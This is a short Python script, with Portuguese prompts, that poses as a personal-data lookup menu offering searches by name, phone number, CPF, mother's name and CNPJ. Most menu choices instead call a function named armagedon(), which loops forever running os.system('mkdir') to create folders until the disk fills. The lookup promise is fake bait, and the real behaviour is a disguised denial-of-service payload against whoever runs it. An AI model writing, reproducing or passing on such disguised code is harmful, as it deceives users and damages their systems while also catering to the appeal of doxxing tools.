import os
from time import sleep


def armagedon():
    while True:
        global contador
        os.system(f'mkdir pasta{contador}')
        contador += 1


def clear():
    print(os.name)
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')


def banner():
    print(f'{verde}.s5ssSs.   .s5SSSs.   .s5SSSs.   .s5SSSs.   .s5SSSs.   s. ')
    print('   SS SS.        SS.        SS.        SS.        SS.  SS.')
    print('sS SS S%S  sS    S%S  sS    `:;  sS    S%S  sS    `:;  S%S')
    print('SS :; S%S  SSSs. S%S  SS         SSSs. S%S  `:;;;;.    S%S')
    print('SS :; S%S  SSSs. S%S  SS         SSSs. S%S  `:;;;;.    S%S')
    print('SS    S%S  SS    S%S  SS         SS    S%S        ;;.  S%S')
    print('SS    `:;  SS    `:;  SS         SS    `:;        `:;  `:;')
    print('SS    ;,.  SS    ;,.  SS    ;,.  SS    ;,.  .,;   ;,.  ;,.')
    print(f':;    ;:   :;    ;:   `:;;;;;:   :;    ;:   `:;;;;;:   ;:{fim_da_cor}')


def opcao():
    opc = int(input(f'Digite a opção:\n[1] Consulta nome {verde}[on]{fim_da_cor}\n'
                    f'[2] Consulta número {verde}[on]{fim_da_cor}\n[3] Consulta cpf {vermelho}[off]{fim_da_cor}\n'
                    f'[4] consulta mãe {vermelho}[off]{fim_da_cor}\n[5] Consulta cnpj {verde}[on]{fim_da_cor}\n'
                    f'[6] Créditos\n   >>>'))
    return opc


def condicoes():
    banner()
    op = opcao()
    if op == 1:
        input('nome > ')
        sleep(1)
        clear()
        armagedon()
    elif op == 2:
        input('número > ')
        sleep(1)
        clear()
        armagedon()
    elif op == 3:
        print('Eu avisei que estava off!')
        sleep(1)
        clear()
        armagedon()
    elif op == 4:
        print('Eu avisei que estava off!')
        sleep(1)
        clear()
        armagedon()
    elif op == 5:
        input('cnpj > ')
        sleep(1)
        clear()
        armagedon()
    elif op == 6:
        print('macasi ou @cauabeisola (insta)')
        sleep(3)
        clear()
    return op


verde = '\033[0;32m'
vermelho = '\033[0;31m'
fim_da_cor = '\033[m'
contador = 0
op = condicoes()
while op == 6:
    condicoes()
